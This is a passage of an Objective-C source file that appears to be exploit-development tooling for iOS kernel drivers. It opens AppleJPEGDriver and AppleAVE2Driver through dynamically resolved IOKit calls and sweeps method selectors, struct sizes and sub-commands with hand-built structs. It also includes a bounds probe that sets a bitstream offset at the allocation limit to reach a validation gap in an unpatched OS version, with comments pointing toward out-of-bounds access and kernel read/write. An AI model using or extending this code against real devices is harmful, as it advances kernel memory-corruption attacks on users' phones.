#import "AVEOpenSmoke.h"
#include "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"
#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <mach/mach_time.h>
#import <mach/ndr.h>
#import <pthread.h>
#import <pthread/qos.h>
// mach_vm.h is blocked on iOS SDK (#error "unsupported"), so forward declare
extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address,
                                  mach_vm_size_t size, vm_offset_t *data,
                                  mach_msg_type_number_t *count);
#import <sys/uio.h>
#import <unistd.h>
#import <fcntl.h>
#import <errno.h>
#import <sys/mman.h>
#import <sys/socket.h>
#import <sys/fileport.h>
#import <mach-o/dyld.h>
#import <string.h>
#import <stdarg.h>
#import <mach/thread_policy.h>
#import <aio.h>
#import <sys/event.h>
#import <sys/syscall.h>

// mach_vm functions not in iOS SDK headers
extern kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
    mach_vm_size_t size, mach_vm_offset_t mask, int flags,
    mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy,
    vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
extern kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address,
    mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address,
    mach_vm_size_t size);
extern kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
    mach_vm_size_t *size, mach_vm_address_t offset, vm_prot_t permission,
    mem_entry_name_port_t *object_handle, mem_entry_name_port_t parent_entry);
#import <Metal/Metal.h>
#import <objc/message.h>
extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
extern kern_return_t mach_vm_remap(vm_map_t target_task, mach_vm_address_t *address,
    mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_read_t src_task,
    mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection,
    vm_prot_t *max_protection, vm_inherit_t inheritance);
extern kern_return_t mach_vm_purgable_control(vm_map_t target, mach_vm_address_t address,
    int control, int *state);
extern kern_return_t mach_vm_page_info(vm_map_t target, mach_vm_address_t address,
    int flavor, int *info, mach_msg_type_number_t *count);
#ifndef VM_FLAGS_PURGABLE
#define VM_FLAGS_PURGABLE 0x00000008
#endif
#ifndef VM_PURGABLE_SET_STATE
#define VM_PURGABLE_SET_STATE 0
#define VM_PURGABLE_GET_STATE 1
#define VM_PURGABLE_VOLATILE  1
#define VM_PURGABLE_EMPTY     2
#endif
#ifndef VM_PAGE_INFO_BASIC
#define VM_PAGE_INFO_BASIC 1
#endif
#ifndef MAP_MEM_NAMED_CREATE
#define MAP_MEM_NAMED_CREATE 0x020000
#define MAP_MEM_PURGABLE     0x040000
#define MAP_MEM_VM_COPY      0x200000
#endif
#import <objc/runtime.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>

// iOS app SDK has no public IOKit headers -- keep types local; resolve symbols via dlopen.
typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef struct __IOSurface *IOSurfaceRef;

typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *name);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t mainPort, CFDictionaryRef matching);
typedef kern_return_t (*IOServiceOpen_t)(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect);
typedef kern_return_t (*IOServiceClose_t)(io_connect_t connect);
typedef kern_return_t (*IOObjectRelease_t)(io_object_t object);
typedef kern_return_t (*IOConnectCallMethod_t)(mach_port_t connection, uint32_t selector,
                                               const uint64_t *input, uint32_t inputCnt,
                                               const void *inputStruct, size_t inputStructCnt,
                                               uint64_t *output, uint32_t *outputCnt,
                                               void *outputStruct, size_t *outputStructCnt);

// Mach port type trap (for brute-force port scan)
extern kern_return_t mach_port_type(task_t task, mach_port_name_t name, mach_port_type_t *type);

typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(IOSurfaceRef);
typedef size_t (*IOSurfaceGetAllocSize_t)(IOSurfaceRef);
typedef kern_return_t (*IOSurfaceLock_t)(IOSurfaceRef, uint32_t, void *);
typedef void (*IOSurfaceUnlock_t)(IOSurfaceRef, uint32_t, void *);
typedef void *(*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);
typedef kern_return_t (*IOSurfaceSetPurgeable_t)(IOSurfaceRef, uint32_t, uint32_t *);

// Registry enumeration (find all GPU services)
typedef mach_port_t io_iterator_t;
typedef kern_return_t (*IORegistryCreateIterator_t)(mach_port_t mainPort, const char *plane, uint32_t options, io_iterator_t *iter);
typedef io_object_t (*IOIteratorNext_t)(io_iterator_t iter);
typedef kern_return_t (*IOObjectGetClass_t)(io_object_t object, char *className, uint32_t *size);

// Static C callback for IOServiceAddInterestNotification (must be C func, not block)
static volatile int g_notifyFired = 0;
static volatile uintptr_t g_notifyRefcon = 0;
static void luminaNotifyCallback(void *refcon, io_service_t service,
                                  uint32_t msgType, void *msgArg) {
    g_notifyFired++;
    g_notifyRefcon = (uintptr_t)refcon;
}

@implementation AVEOpenSmoke

+ (NSString *)openNamedDriver:(const char *)name label:(NSString *)label {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendFormat:@"target: %@ (%s)\n", label, name];

    void *handle = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!handle) {
        [out appendFormat:@"dlopen IOKit failed: %s\n", dlerror()];
        return out;
    }

    IOServiceMatching_t pMatching = dlsym(handle, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(handle, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(handle, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(handle, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(handle, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(handle, "kIOMainPortDefault");
    if (!pMainPort) {
        pMainPort = dlsym(handle, "kIOMasterPortDefault");
    }

    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pMainPort) {
        [out appendString:@"dlsym missing one or more IOKit symbols\n"];
        return out;
    }

    CFMutableDictionaryRef matching = pMatching(name);
    if (!matching) {
        [out appendString:@"IOServiceMatching failed\n"];
        return out;
    }

    io_service_t service = pGet(*pMainPort, matching);
    if (service == 0) {
        [out appendString:@"service: NOT FOUND\n"];
        return out;
    }
    [out appendFormat:@"service: found (%u)\n", service];

    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);

    [out appendFormat:@"IOServiceOpen: 0x%08x (%d)\n", kr, kr];
    if (kr == KERN_SUCCESS) {
        [out appendFormat:@"conn: %u\n", conn];
        [out appendString:@"OPEN OK -- stop here; report this to lab notes\n"];
        pClose(conn);
    } else {
        [out appendString:@"OPEN FAILED -- report this hex; do not call methods\n"];
    }
    return out;
}

+ (NSString *)runOpenOnly {
    return [self openNamedDriver:"AppleAVE2Driver" label:@"P007 AVE"];
}

+ (NSString *)runJPEGOpenOnly {
    return [self openNamedDriver:"AppleJPEGDriver" label:@"P008 JPEG"];
}

+ (NSString *)runJPEGBoundsProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendString:@"P008 Path B -- startOfRawBitStream @ +0x80 (sel5 / 0x1000)\n"];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"Cite: RE_P008_startOfRawBitStream.md\n"];
    [out appendString:@"26.6 rejects when field >= source allocSize (0xe00002c2).\n"];
    [out appendString:@"Lab 26.5: no that reject. N=1.\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) {
        [out appendString:@"STOP dlopen IOKit/IOSurface\n"];
        return out;
    }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    IOSurfaceGetAllocSize_t iosAlloc = dlsym(iosH, "IOSurfaceGetAllocSize");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID || !iosAlloc) {
        [out appendString:@"STOP dlsym\n"];
        return out;
    }

    NSDictionary *props = @{
        @"IOSurfaceWidth": @64,
        @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfaceBytesPerRow": @(64 * 4),
        @"IOSurfaceAllocSize": @(64 * 64 * 4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)props);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)props);
    if (!src || !dst) {
        [out appendString:@"STOP IOSurfaceCreate\n"];
        return out;
    }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);
    size_t alloc = iosAlloc(src);
    [out appendFormat:@"src id=%u alloc=%zu dst id=%u\n", srcID, alloc, dstID];

    enum { kStruct = 0x1000 };
    uint8_t *buf = calloc(1, kStruct);
    if (!buf) {
        [out appendString:@"STOP calloc\n"];
        return out;
    }

    /* Best-effort Ext layout from startDecoder copy list (uint32 index view). */
    uint32_t *u32 = (uint32_t *)buf;
    u32[0] = 64;           /* width-ish */
    u32[1] = 64;           /* height-ish */
    u32[5] = 64;
    u32[6] = 64;
    /* QWORD surface slots at byte +0x30 / +0x38 / +0x40 */
    *(uint64_t *)(buf + 0x30) = srcID;
    *(uint64_t *)(buf + 0x38) = dstID;
    *(uint64_t *)(buf + 0x40) = 0;
    u32[0x12] = 1;         /* session-ish id used in logs */

    /* Cited field: startOfRawBitStream @ +0x80 */
    uint32_t rawOff = (uint32_t)alloc; /* boundary: >= allocSize rejects on 26.6 */
    *(uint32_t *)(buf + 0x80) = rawOff;
    [out appendFormat:@"struct[0x80]=startOfRawBitStream=%u (==alloc)\n", rawOff];

    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) {
        [out appendString:@"STOP service\n"];
        free(buf);
        return out;
    }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);
    [out appendFormat:@"IOServiceOpen: 0x%08x\n", kr];
    if (kr != KERN_SUCCESS) {
        free(buf);
        return out;
    }

    uint8_t outStruct[kStruct];
    memset(outStruct, 0, sizeof(outStruct));
    size_t outCnt = kStruct;
    const uint32_t sel = 5; /* Ext startDecoder -- cited */
    [out appendFormat:@"IOConnectCallMethod sel=%u structIn=0x%x\n", sel, kStruct];
    kr = pCall(conn, sel, NULL, 0, buf, kStruct, NULL, NULL, outStruct, &outCnt);
    [out appendFormat:@"call -> 0x%08x", (unsigned)kr];
    if (kr == 0) [out appendString:@" (SUCCESS)\n"];
    else if ((unsigned)kr == 0xe00002c2) [out appendString:@" (BadArgument -- 26.6-shaped reject)\n"];
    else if ((unsigned)kr == 0xe00002bc) [out appendString:@" (Error)\n"];
    else if ((unsigned)kr == 0xe00002e2) [out appendString:@" (NotPermitted)\n"];
    else [out appendString:@"\n"];
    [out appendFormat:@"outStructCnt=%zu\n", outCnt];
    [out appendString:@"leaving; do not re-tap\n"];

    pClose(conn);
    free(buf);
    (void)src;
    (void)dst;
    return out;
}

+ (NSString *)runJPEGSelectorSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 selector sweep -- find dispatch entries (sel 0-7)\n"];
    [out appendString:@"JPEG open OK on 23F77; sel5 returned 0xe00002cc (wrong struct?).\n"];
    [out appendString:@"Goal: find selector + size that gets past initial validation.\n"];
    [out appendString:@"Not KRW\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) {
        [out appendString:@"STOP dlopen IOKit\n"];
        return out;
    }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort) {
        [out appendString:@"STOP dlsym\n"];
        return out;
    }

    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) {
        [out appendString:@"STOP service not found\n"];
        return out;
    }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);
    [out appendFormat:@"IOServiceOpen: 0x%08x\n", (unsigned)kr];
    if (kr != KERN_SUCCESS) {
        [out appendString:@"OPEN FAILED -- stop\n"];
        return out;
    }
    [out appendFormat:@"conn: %u\n", conn];

    // Try selectors 0-7 with a zeroed 0x1000 struct.
    // Log return code + output size for each.
    enum { kStruct = 0x1000 };
    uint8_t *buf = calloc(1, kStruct);
    if (!buf) {
        [out appendString:@"STOP calloc\n"];
        pClose(conn);
        return out;
    }

    for (uint32_t sel = 0; sel < 8; sel++) {
        uint8_t outStruct[kStruct];
        memset(outStruct, 0, sizeof(outStruct));
        size_t outCnt = kStruct;
        kern_return_t r = pCall(conn, sel, NULL, 0, buf, kStruct,
                                NULL, NULL, outStruct, &outCnt);
        [out appendFormat:@"sel=%u -> 0x%08x", sel, (unsigned)r];
        if (r == 0) [out appendString:@" (OK)\n"];
        else if ((unsigned)r == 0xe00002c2) [out appendString:@" (BadArgument)\n"];
        else if ((unsigned)r == 0xe00002e2) [out appendString:@" (NotPermitted)\n"];
        else if ((unsigned)r == 0xe00002cc) [out appendString:@" (unsupported/wrong-struct?)\n"];
        else if ((unsigned)r == 0xe00002bc) [out appendString:@" (Error)\n"];
        else [out appendFormat:@"\n"];
    }

    free(buf);
    pClose(conn);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Read: sel with OK or non-BadArgument -> dispatch entry; RE struct from there\n"];
    return out;
}

+ (NSString *)runJPEGSizeSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 size sweep v2 -- filled struct (not zeroed)\n"];
    [out appendString:@"v1 all BadArg: zeroed struct rejected before size check.\n"];
    [out appendString:@"v2: fill width/height/surfaceIDs like runJPEGBoundsProbe.\n"];
    [out appendString:@"Not KRW\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    // Create two small IOSurfaces for src/dst IDs (like runJPEGBoundsProbe).
    NSDictionary *props = @{
        @"IOSurfaceWidth": @64,
        @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfaceBytesPerRow": @(64 * 4),
        @"IOSurfaceAllocSize": @(64 * 64 * 4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)props);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)props);
    if (!src || !dst) { [out appendString:@"STOP IOSurfaceCreate\n"]; return out; }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);
    [out appendFormat:@"src id=%u dst id=%u\n", srcID, dstID];

    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) { [out appendString:@"STOP service\n"]; return out; }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);
    if (kr != KERN_SUCCESS) { [out appendFormat:@"OPEN FAIL 0x%08x\n", (unsigned)kr]; return out; }
    [out appendFormat:@"conn: %u\n", conn];

    size_t sizes[] = {0x100, 0x200, 0x300, 0x400, 0x500, 0x600, 0x800, 0x1000, 0x2000};
    int nSizes = (int)(sizeof(sizes) / sizeof(sizes[0]));

    for (uint32_t sel = 4; sel <= 5; sel++) {
        [out appendFormat:@"\n--- sel=%u ---\n", sel];
        for (int i = 0; i < nSizes; i++) {
            size_t sz = sizes[i];
            uint8_t *buf = calloc(1, sz);
            if (!buf) continue;

            // Fill minimal fields like runJPEGBoundsProbe (if they fit).
            if (sz >= 0x84) {
                uint32_t *u32 = (uint32_t *)buf;
                u32[0] = 64;           // width
                u32[1] = 64;           // height
                u32[5] = 64;
                u32[6] = 64;
                *(uint64_t *)(buf + 0x30) = srcID;
                *(uint64_t *)(buf + 0x38) = dstID;
                if (sz >= 0x82) {
                    *(uint32_t *)(buf + 0x80) = 0; // startOfRawBitStream (safe: 0 < alloc)
                }
            }

            // Match selector sweep: output struct 0x1000.
            uint8_t outStruct[0x1000];
            memset(outStruct, 0, sizeof(outStruct));
            size_t outCnt = sizeof(outStruct);
            kern_return_t r = pCall(conn, sel, NULL, 0, buf, sz,
                                    NULL, NULL, outStruct, &outCnt);
            [out appendFormat:@"  size=0x%04zx -> 0x%08x", sz, (unsigned)r];
            if (r == 0) [out appendString:@" (OK!)"];
            else if ((unsigned)r == 0xe00002c2) [out appendString:@" BadArg"];
            else if ((unsigned)r == 0xe00002bc) [out appendString:@" Error"];
            else if ((unsigned)r == 0xe00002cc) [out appendString:@" 02cc"];
            [out appendString:@"\n"];
            free(buf);
            if (r == 0) break;
        }
    }

    pClose(conn);
    CFRelease(src);
    CFRelease(dst);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Read: non-BadArg = right size+content; OK = dispatch success; RE fields from there\n"];
    return out;
}

+ (NSString *)runJPEGContentProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 content probe -- sel=5 / 0x1000 / JPEG header in src\n"];
    [out appendString:@"Size confirmed 0x1000. 0xe00002cc = likely no JPEG data.\n"];
    [out appendString:@"Goal: get past 02cc to reach crop offset path.\n"];
    [out appendString:@"Not KRW\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    IOSurfaceGetAllocSize_t iosAlloc = dlsym(iosH, "IOSurfaceGetAllocSize");
    IOSurfaceLock_t iosLock = dlsym(iosH, "IOSurfaceLock");
    IOSurfaceUnlock_t iosUnlock = dlsym(iosH, "IOSurfaceUnlock");
    IOSurfaceGetBaseAddress_t iosGetBase = dlsym(iosH, "IOSurfaceGetBaseAddress");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID || !iosAlloc || !iosLock || !iosUnlock || !iosGetBase) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    // Source surface: 4KB, enough for a tiny JPEG.
    NSDictionary *srcProps = @{
        @"IOSurfaceWidth": @64,
        @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @1,
        @"IOSurfaceBytesPerRow": @64,
        @"IOSurfaceAllocSize": @4096,
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    // Dest surface: same.
    NSDictionary *dstProps = @{
        @"IOSurfaceWidth": @64,
        @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @1,
        @"IOSurfaceBytesPerRow": @64,
        @"IOSurfaceAllocSize": @4096,
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)srcProps);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)dstProps);
    if (!src || !dst) { [out appendString:@"STOP IOSurfaceCreate\n"]; return out; }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);
    size_t alloc = iosAlloc(src);
    [out appendFormat:@"src id=%u alloc=%zu dst id=%u\n", srcID, alloc, dstID];

    // Write a minimal JPEG header into the source surface.
    // SOI (0xFF 0xD8) + APP0 (0xFF 0xE0) + minimal JFIF + SOF0 + SOS + EOI
    iosLock(src, 0, NULL);
    void *srcBase = iosGetBase(src);
    if (srcBase) {
        uint8_t *jp = (uint8_t *)srcBase;
        // SOI
        jp[0] = 0xFF; jp[1] = 0xD8;
        // APP0 marker (minimal JFIF)
        jp[2] = 0xFF; jp[3] = 0xE0;
        jp[4] = 0x00; jp[5] = 0x10; // length = 16
        jp[6] = 0x4A; jp[7] = 0x46; jp[8] = 0x49; jp[9] = 0x46; // "JFIF"
        jp[10] = 0x00; // version 1.01
        jp[11] = 0x01; jp[12] = 0x01;
        jp[13] = 0x00; // no units
        jp[14] = 0x00; jp[15] = 0x01; // X density
        jp[16] = 0x00; jp[17] = 0x01; // Y density
        jp[18] = 0x00; jp[19] = 0x00; // no thumbnail
        // SOF0 (Start of Frame, baseline DCT)
        jp[20] = 0xFF; jp[21] = 0xC0;
        jp[22] = 0x00; jp[23] = 0x0B; // length = 11
        jp[24] = 0x08; // 8-bit precision
        jp[25] = 0x00; jp[26] = 0x40; // height = 64
        jp[27] = 0x00; jp[28] = 0x40; // width = 64
        jp[29] = 0x01; // 1 component (grayscale)
        jp[30] = 0x01; // component id
        jp[31] = 0x11; // sampling 1x1
        jp[32] = 0x00; // quant table 0
        // DHT (Huffman table, minimal)
        jp[33] = 0xFF; jp[34] = 0xC4;
        jp[35] = 0x00; jp[36] = 0x05; // length = 5
        jp[37] = 0x00; // DC table 0
        // DQT (Quantization table, minimal)
        jp[38] = 0xFF; jp[39] = 0xDB;
        jp[40] = 0x00; jp[41] = 0x05; // length = 5
        jp[42] = 0x00; // table 0
        // SOS (Start of Scan)
        jp[43] = 0xFF; jp[44] = 0xDA;
        jp[45] = 0x00; jp[46] = 0x03; // length = 3
        jp[47] = 0x01; // 1 component
        jp[48] = 0x01; jp[49] = 0x00; // component + DC/AC table
        jp[50] = 0x00; jp[51] = 0x3F; jp[52] = 0x00; // spectral selection
        // Minimal scan data (zeros)
        // EOI
        jp[60] = 0xFF; jp[61] = 0xD9;
        [out appendFormat:@"JPEG header written: %zu bytes at src base\n", (size_t)62];
    } else {
        [out appendString:@"STOP: cannot get src base address\n"];
        iosUnlock(src, 0, NULL);
        CFRelease(src); CFRelease(dst);
        return out;
    }
    iosUnlock(src, 0, NULL);

    // Open JPEG driver.
    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) { [out appendString:@"STOP service\n"]; CFRelease(src); CFRelease(dst); return out; }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);
    if (kr != KERN_SUCCESS) { [out appendFormat:@"OPEN FAIL 0x%08x\n", (unsigned)kr]; CFRelease(src); CFRelease(dst); return out; }
    [out appendFormat:@"conn: %u\n", conn];

    // Build 0x1000 struct -- AVE Start path fields at RE'd offsets.
    enum { kStruct = 0x1000 };
    uint8_t *buf = calloc(1, kStruct);
    uint32_t *u32 = (uint32_t *)buf;
    // Width @ 0xa70, Height @ 0xa74 (from AppleAVE2UserClient_Start RE)
    *(uint32_t *)(buf + 0xa70) = 64;  // width (Start path)
    *(uint32_t *)(buf + 0xa74) = 64;  // height (Start path)
    // Surface IDs @ 0x2ac/0x2b0 (confirmed in both Start and Process paths)
    *(uint32_t *)(buf + 0x2ac) = srcID;
    *(uint32_t *)(buf + 0x2b0) = dstID;
    // pixelsX @ 0x428, pixelsY @ 0x42c (Process path / crop check)
    *(uint32_t *)(buf + 0x428) = 64;
    *(uint32_t *)(buf + 0x42c) = 64;
    u32[0x12] = 1;  // session id
    *(uint32_t *)(buf + 0x80) = 0;  // startOfRawBitStream

    // Try sel=5 with surface IDs at handler offsets.
    uint8_t outStruct[kStruct];
    memset(outStruct, 0, sizeof(outStruct));
    size_t outCnt = sizeof(outStruct);
    kr = pCall(conn, 5, NULL, 0, buf, kStruct, NULL, NULL, outStruct, &outCnt);
    [out appendFormat:@"\nsel=5 (w/h@0xa70/0xa74, IDs@0x2ac/0x2b0) -> 0x%08x", (unsigned)kr];
    if (kr == 0) [out appendString:@" (OK!)"];
    else if ((unsigned)kr == 0xe00002c2) [out appendString:@" BadArg"];
    else if ((unsigned)kr == 0xe00002bc) [out appendString:@" Error"];
    else if ((unsigned)kr == 0xe00002cc) [out appendString:@" NoSpace"];
    else [out appendString:@" (NEW!)"];
    [out appendString:@"\n"];

    // Also try sel=4 (startEncoder?) with same struct.
    memset(outStruct, 0, sizeof(outStruct));
    outCnt = sizeof(outStruct);
    kr = pCall(conn, 4, NULL, 0, buf, kStruct, NULL, NULL, outStruct, &outCnt);
    [out appendFormat:@"sel=4 (same struct) -> 0x%08x", (unsigned)kr];
    if (kr == 0) [out appendString:@" (OK!)"];
    else if ((unsigned)kr == 0xe00002c2) [out appendString:@" BadArg"];
    else if ((unsigned)kr == 0xe00002bc) [out appendString:@" Error"];
    else if ((unsigned)kr == 0xe00002cc) [out appendString:@" 02cc"];
    else [out appendString:@" (new code!)"];
    [out appendString:@"\n"];

    free(buf);
    pClose(conn);
    CFRelease(src);
    CFRelease(dst);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Read: new code = deeper; OK = dispatch success; then set xOffset > pixelsX\n"];
    return out;
}

+ (NSString *)runJPEGSubCmdSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 sub-command sweep -- sel=5, struct[0xd0]=0..25\n"];
    [out appendString:@"Dispatch table: idx 3,5,7,8,15,25->common; 6->unique; 16-18->unique\n"];
    [out appendString:@"Not KRW\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
